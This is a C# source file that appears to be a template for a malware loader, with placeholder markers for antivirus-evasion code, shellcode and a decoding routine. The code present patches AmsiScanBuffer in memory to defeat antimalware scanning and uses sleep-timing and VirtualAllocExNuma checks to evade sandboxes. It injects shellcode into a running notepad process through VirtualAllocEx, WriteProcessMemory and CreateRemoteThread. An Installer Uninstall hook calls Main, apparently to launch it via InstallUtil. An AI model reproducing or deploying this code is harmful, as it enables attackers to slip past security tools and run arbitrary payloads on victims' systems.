using System;
using System.Net;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Configuration.Install;

namespace Laicy
{
    class Program
    {
		[DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        
		[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)] 
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
        
		[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)] 
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        
		[DllImport("kernel32.dll")] 
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
        
		[DllImport("kernel32.dll")] static extern IntPtr 
        CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        static void cleaning()
        {
            // all credits to https://rastamouse.me/memory-patching-amsi-bypass/
            var modules = Process.GetCurrentProcess().Modules;
            var hAmsi = IntPtr.Zero;

            foreach (ProcessModule module in modules)
            {
                if (module.ModuleName == "amsi.dll")
                {
                    hAmsi = module.BaseAddress;
                    Console.WriteLine("Found isma");
                    break;
                }
            }
            if (hAmsi == IntPtr.Zero)
            {
                return;
            }
            else
            {
                var asb = GetProcAddress(hAmsi, "AmsiScanBuffer");
                var garbage = Encoding.UTF8.GetBytes("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");

                VirtualProtect(asb, (UIntPtr)garbage.Length, 0x40, out uint oldProtect);

                Marshal.Copy(garbage, 0, asb, garbage.Length);

                VirtualProtect(asb, (UIntPtr)garbage.Length, oldProtect, out uint _);

                Console.WriteLine("Patched");
            }
        }
		
		static bool buy_in()
        {
            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5)
            {
                return false;
            }

            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                return false;
            }

            return true;
        }

		public static void Main()
        {
			
			!!!_AVEVASION_MARK!!!  
			
			!!!_SHELLCODE_MARK!!!
			
			!!!DECODE_ROUTINE!!!
			
			Process[] expProc = Process.GetProcessesByName("notepad"); 
            int pid = expProc[0].Id;
            IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)buf.Length, 0x3000, 0x40);
            
            IntPtr outSize;
            
			WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);
            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        }
		[System.ComponentModel.RunInstaller(true)]
		public class Sample : System.Configuration.Install.Installer
		{
			public override void Uninstall(System.Collections.IDictionary savedState)
			{
				Program.Main();
			}
		}
    }
}
